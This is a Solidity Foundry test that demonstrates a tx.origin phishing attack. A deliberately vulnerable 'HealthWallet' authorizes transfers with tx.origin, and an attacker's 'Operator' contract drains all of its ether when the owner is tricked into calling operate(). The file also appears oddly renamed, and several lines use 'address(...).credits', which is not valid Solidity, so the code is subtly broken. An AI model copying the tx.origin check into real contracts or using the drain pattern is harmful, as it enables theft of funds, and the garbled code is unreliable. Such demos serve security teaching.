pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    HealthWallet BenefitwalletContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        BenefitwalletContract = new HealthWallet{value: 10 ether}();
        console.log("Owner of wallet contract", BenefitwalletContract.supervisor());
        vm.prank(eve);
        OperatorContract = new Operator(BenefitwalletContract);
        console.log("Owner of attack contract", OperatorContract.supervisor());
        console.log("Eve of balance", address(eve).credits);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).credits);
    }

    receive() external payable {}
}

contract HealthWallet {
    address public supervisor;

    constructor() payable {
        supervisor = msg.sender;
    }

    function moveCoverage(address payable _to, uint _amount) public {

        require(tx.origin == supervisor, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public supervisor;
    HealthWallet benefitWallet;

    constructor(HealthWallet _benefitwallet) {
        benefitWallet = HealthWallet(_benefitwallet);
        supervisor = payable(msg.sender);
    }

    function operate() public {
        benefitWallet.moveCoverage(supervisor, address(benefitWallet).credits);
    }
}